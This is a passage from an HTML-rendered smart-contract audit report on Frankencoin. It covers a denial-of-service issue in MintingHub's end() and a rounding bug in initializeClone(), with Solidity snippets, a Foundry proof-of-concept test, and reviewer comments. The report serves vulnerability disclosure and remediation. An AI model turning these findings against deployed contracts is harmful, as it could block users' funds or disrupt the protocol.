<code>MintingHub.sol</code> the transfer will revert due to the ERC20 requirement.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"25\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">MintingHub</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">252</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">end</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_challengeNumber</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">postponeCollateralReturn</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">260</span><span class=\"mtk1\">:         (</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">owner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">effectiveBid</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">volume</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">repayment</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">reservePPM</span><span class=\"mtk1\">) = </span><span class=\"mtk12\">challenge</span><span class=\"mtk1\">.</span><span class=\"mtk12\">position</span><span class=\"mtk1\">.</span><span class=\"mtk11\">notifyChallengeSucceeded</span><span class=\"mtk1\">(</span><span class=\"mtk12\">recipient</span><span class=\"mtk1\">, </span><span class=\"mtk12\">challenge</span><span class=\"mtk1\">.</span><span class=\"mtk12\">bid</span><span class=\"mtk1\">, </span><span class=\"mtk12\">challenge</span><span class=\"mtk1\">.</span><span class=\"mtk12\">size</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">261</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">effectiveBid</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">challenge</span><span class=\"mtk1\">.</span><span class=\"mtk12\">bid</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">262</span><span class=\"mtk1\">:             </span><span class=\"mtk3\">// overbid, return excess amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">263</span><span class=\"mtk1\">:             </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">zchf</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">challenge</span><span class=\"mtk1\">.</span><span class=\"mtk12\">bidder</span><span class=\"mtk1\">, </span><span class=\"mtk12\">challenge</span><span class=\"mtk1\">.</span><span class=\"mtk12\">bid</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">effectiveBid</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">264</span><span class=\"mtk1\">:         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">265</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">reward</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">volume</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">CHALLENGER_REWARD</span><span class=\"mtk1\">) / </span><span class=\"mtk7\">1000_000</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">266</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">fundsNeeded</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">reward</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">repayment</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">267</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">effectiveBid</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">fundsNeeded</span><span class=\"mtk1\">){</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">268</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">zchf</span><span class=\"mtk1\">.</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">effectiveBid</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">fundsNeeded</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ERC20</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">151</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">recipient</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">virtual</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">152</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">recipient</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">));</span></span></span></code></pre>\n<p><strong>Not enough balance in zchf</strong></p>\n<p>When the protocol incur multiple loss event, the balance could be too low. In such extreme situations, the zchf transfer would also fail. The <code>end()</code> would DoS temporarily.</p>\n<h3 id=\"recommended-mitigation-steps-9\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-9\" aria-label=\"recommended mitigation steps 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>A more robust way to handle multiple party fund transfer is to provide alternative ways to refund apart from all in one in <code>end()</code>. Just like the <code>returnPostponedCollateral()</code> in <code>MintingHub.sol</code>.</p>\n<ul>\n<li>In <code>end()</code>, record the amount should be transferred to each user, and provide option for them to pull the fund later. If separate the transfer from <code>end()</code>, provide the option for the challenger and bidder to pull the fund, then in the case that the other transfer or external calls fail in <code>end()</code>, the fund transfer will not dependent on other unexpected factors, and the system could be more robust.</li>\n<li>Check for the total challenge amount, disallow the total challenge to be more than the position collateral .</li>\n</ul>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/680#issuecomment-1515996140\">0xA5DF (lookout) commented</a>:</strong></p>\n<blockquote>\n<p><a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/675\"><code>#675</code></a> and many others mention blacklist.<br>\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/711\"><code>#711</code></a> also mentions ERC777.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/680#issuecomment-1529041794\">luziusmeisser (Frankencoin) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>Generally, the FPS holders can deny tokens that do not confirm to the ERC20 in the desired way. However, tricks like setting the position owner to null still can do harm. This needs to be addressed.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/680#issuecomment-1554518727\">hansfriese (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Yes, the second part is a duplicate of <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/670\">670</a>. I approved 670 as an individual issue as the attack path is unique. So the real contribution of this issue doesn’t contain 670. I approved only the first part for this issue. </p>\n</blockquote>\n<hr>\n<h2 id=\"m-08-initializeclone-price-calculation-should-round-up\" style=\"position:relative;\"><a href=\"#m-08-initializeclone-price-calculation-should-round-up\" aria-label=\"m 08 initializeclone price calculation should round up permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/663\">[M-08] <code>initializeClone()</code> price calculation should round up</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/663\">bin2chen</a></em></p>\n<p><code>initializeClone()</code> Price calculations use <code>round down</code>, which only works if divisible , If precision is lost, it will revert</p>\n<h3 id=\"proof-of-concept-10\" style=\"position:relative;\"><a href=\"#proof-of-concept-10\" aria-label=\"proof of concept 10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>When clone positon, <code>_initialCollateral</code> and <code>_initialMint</code> are used to calculate the <code>price</code> of the clone position</p>\n<p>The code is as follows:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"26\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">initializeClone</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">owner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_price</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_limit</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_coll</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_mint</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyHub</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_coll</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">minimumCollateral</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InsufficientCollateral</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">setOwner</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">price</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_mint</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">ONE_DEC18</span><span class=\"mtk1\"> / </span><span class=\"mtk12\">_coll</span><span class=\"mtk1\">;   </span><span class=\"mtk3\">//&lt;----------use round down</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">price</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">_price</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InsufficientCollateral</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">limit</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_limit</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">mintInternal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_mint</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_coll</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">PositionOpened</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">original</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">zchf</span><span class=\"mtk1\">), </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">collateral</span><span class=\"mtk1\">), </span><span class=\"mtk12\">_price</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<ol>\n<li>The price calculation formula <code>price = _mint * ONE_DEC18 / _coll</code>，  use <code>round down</code></li>\n<li>In the next step <code>mintInternal()</code> will execute mint, and internally will call <code>checkCollateral()</code></li>\n</ol>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"27\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">checkCollateral</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collateralReserve</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">atPrice</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">collateralReserve</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">atPrice</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">minted</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">ONE_DEC18</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InsufficientCollateral</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><code>checkCollateral()</code> will check <code>collateralReserve * atPrice &#x3C; minted * ONE_DEC18</code></p>\n<p>This has a problem, when calculating the price and there is a precision loss in price (round down), then <code>checkCollateral()</code> will definitely revert</p>\n<p>Because if precision loss occurs, <code>collateralReserve * atPrice</code> will be 1 less than <code>minted * ONE_DEC18</code></p>\n<p>For example:</p>\n<p>_initialCollateral = 101e18;<br>\n_initialMint = 100e18;</p>\n<p>Due to round down price = 0.99e18</p>\n<p>Then <code>checkCollateral ()</code> will revert because <code>101e18 * 0.99e18 &#x3C; 100e18 * 1e18</code></p>\n<p>Here is the demo code:</p>\n<p>Will revert <code>InsufficientCollateral</code> in <code>checkCollateral ()</code><br>\nAdd to <code>GeneralTest.t.sol</code></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"28\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testCloneRevert</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// 0.get 1000 for open bad position</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">alice</span><span class=\"mtk1\">.</span><span class=\"mtk11\">obtainFrankencoins</span><span class=\"mtk1\">(</span><span class=\"mtk12\">swap</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1000</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">col</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">alice</span><span class=\"mtk1\">), </span><span class=\"mtk7\">1001</span><span class=\"mtk1\">);  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// 1. open new position</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">alice</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">col</span><span class=\"mtk1\">.</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">hub</span><span class=\"mtk1\">), </span><span class=\"mtk7\">1001</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">oldPrice</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> * (</span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">36</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">Position</span><span class=\"mtk1\"> </span><span class=\"mtk12\">pos</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">Position</span><span class=\"mtk1\">(</span><span class=\"mtk12\">hub</span><span class=\"mtk1\">.</span><span class=\"mtk11\">openPosition</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">col</span><span class=\"mtk1\">), </span><span class=\"mtk7\">100</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1001</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1000000</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">, </span><span class=\"mtk7\">100</span><span class=\"mtk1\"> </span><span class=\"mtk12\">days</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">days</span><span class=\"mtk1\">, </span><span class=\"mtk7\">25000</span><span class=\"mtk1\">, </span><span class=\"mtk12\">oldPrice</span><span class=\"mtk1\">, </span><span class=\"mtk7\">200000</span><span class=\"mtk1\">));        </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">skip</span><span class=\"mtk1\">(</span><span class=\"mtk7\">7</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">86_400</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">60</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;0.pos price:&quot;</span><span class=\"mtk1\">,</span><span class=\"mtk12\">pos</span><span class=\"mtk1\">.</span><span class=\"mtk11\">price</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// 2.pass _initialMint  _initialCollateral ,  will  round down</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_initialCollateral</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1001</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_initialMint</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1000</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">10</span><span class=\"mtk1\">**</span><span class=\"mtk7\">18</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">newPrice</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_initialMint</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">10</span><span class=\"mtk1\">**</span><span class=\"mtk7\">18</span><span class=\"mtk1\"> / </span><span class=\"mtk12\">_initialCollateral</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;1.new price:&quot;</span><span class=\"mtk1\">,</span><span class=\"mtk12\">newPrice</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;1.new price Bigger than old ?:&quot;</span><span class=\"mtk1\">,</span><span class=\"mtk12\">newPrice</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">oldPrice</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">col</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">alice</span><span class=\"mtk1\">), </span><span class=\"mtk12\">_initialCollateral</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">col</span><span class=\"mtk1\">.</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">hub</span><span class=\"mtk1\">), </span><span class=\"mtk12\">_initialCollateral</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// 3. clonePosition will revert ,  Although the parameters are all legal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">hub</span><span class=\"mtk1\">.</span><span class=\"mtk11\">clonePosition</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pos</span><span class=\"mtk1\">),</span><span class=\"mtk12\">_initialCollateral</span><span class=\"mtk1\"> , </span><span class=\"mtk12\">_initialMint</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"console\" data-index=\"29\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">$ forge test --match testCloneRevert -vvv</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Running 1 test for test/GeneralTest.t.sol:GeneralTest</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">[FAIL. Reason: InsufficientCollateral()] testCloneRevert() (gas: 2230875)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Logs:</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  0.pos price: 1000000000000000000000000000000000000</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  1.new price: 999000999000999000999000999000999000</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  1.new price Bigger than old ?: false</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Traces:</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  [2131375] GeneralTest::testCloneRevert() </span></span></code></pre>\n<p>It is recommended to use round up.</p>\n<h3 id=\"recommended-mitigation-steps-10\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-10\" aria-label=\"recommended mitigation steps 10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" 